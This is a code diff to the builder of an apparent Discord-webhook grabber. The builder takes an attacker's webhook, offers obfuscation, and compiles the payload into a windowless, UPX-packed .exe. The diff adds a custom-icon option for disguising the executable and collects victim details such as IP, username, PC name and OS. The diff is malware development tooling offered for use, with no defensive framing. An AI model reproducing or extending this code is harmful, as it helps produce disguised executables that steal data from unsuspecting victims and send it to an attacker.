@@ -21,6 +21,7 @@ class Builder:
 
         self.webhook = input(
             f'{Fore.MAGENTA}[{Fore.RESET}+{Fore.MAGENTA}]{Fore.RESET} Enter your webhook: ')
+            
         if not self.check_webhook(self.webhook):
             print(
                 f"{Fore.MAGENTA}[{Fore.RESET}+{Fore.MAGENTA}]{Fore.RESET} {Fore.RED}Invalid Webhook!{Fore.RESET}")
@@ -57,7 +58,16 @@ class Builder:
             f'{Fore.MAGENTA}[{Fore.RESET}+{Fore.MAGENTA}]{Fore.RESET} Do you want to obfuscate the file? (y/n): ')
 
         self.compy = input(
-                f'{Fore.MAGENTA}[{Fore.RESET}+{Fore.MAGENTA}]{Fore.RESET} Do you want to compile the file to a .exe? (y/n): ')
+            f'{Fore.MAGENTA}[{Fore.RESET}+{Fore.MAGENTA}]{Fore.RESET} Do you want to compile the file to a .exe? (y/n): ')
+        
+        if self.compy == 'y':
+            self.icon = input(f'{Fore.MAGENTA}[{Fore.RESET}+{Fore.MAGENTA}]{Fore.RESET} Do you want to add an icon to the .exe (y/n): ')
+            if self.icon == 'y':
+                self.icon_exe()
+            else:
+                pass
+        else:
+            pass
 
         self.mk_file(self.filename, self.webhook)
 
@@ -123,7 +133,7 @@ class Builder:
                                                                   .,***,                                                        ,*/*,..
 
 
-                      IP: {load(urlopen('https://jsonip.com/'))['ip']}
+                      IP: {load(urlopen('https://api.myip.com/'))['ip']}
                 Username: {os.getlogin()}
                  PC Name: {os.getenv('COMPUTERNAME')}
         Operating System: {os.getenv('OS')}
@@ -178,6 +188,21 @@ class Builder:
         os.system('mode con:cols=150 lines=20')
 
         return True
+    
+    def icon_exe(self):
+        self.icon_name = input(f'{Fore.MAGENTA}[{Fore.RESET}+{Fore.MAGENTA}]{Fore.RESET} Enter the name of the icon: ')
+
+        if os.path.isfile(f"./{self.icon_name}"):
+            pass
+        else:
+            print(f'{Fore.RED}[{Fore.RESET}+{Fore.RED}]{Fore.RESET}Icon not found! Please check the name and make sure it\'s in the current directory.')
+            input(f"{Fore.MAGENTA}[{Fore.RESET}+{Fore.MAGENTA}]{Fore.RESET} Press anything to exit...")
+
+        if self.icon_name.endswith('.ico'):
+            pass
+        else:
+            print(f'{Fore.RED}[{Fore.RESET}+{Fore.RED}]{Fore.RESET}Icon must have .ico extension! Please convert it and try again.')
+            input(f"{Fore.MAGENTA}[{Fore.RESET}+{Fore.MAGENTA}]{Fore.RESET} Press anything to exit...")
     
     def renamefile(self, filename):
         try:
@@ -250,7 +275,11 @@ class Builder:
 
     def compile(self, filename):
         print(f'{Fore.MAGENTA}[{Fore.RESET}{Fore.WHITE}+{Fore.RESET}{Fore.MAGENTA}]{Fore.RESET} {Fore.WHITE}Compiling code...{Fore.RESET}')
-        os.system(f'python -m PyInstaller --onefile --noconsole --upx-dir=./upx -i NONE --distpath ./ .\\{filename}.py')
+        if self.icon == 'y':
+            icon = self.icon_name
+        else:
+            icon = None
+        os.system(f'python -m PyInstaller --onefile --noconsole --upx-dir=./upx -i {icon} --distpath ./ .\\{filename}.py')
         print(f'{Fore.MAGENTA}[{Fore.RESET}{Fore.WHITE}+{Fore.RESET}{Fore.MAGENTA}]{Fore.RESET}{Fore.WHITE} Code compiled!{Fore.RESET}')
 
     def run(self, filename):
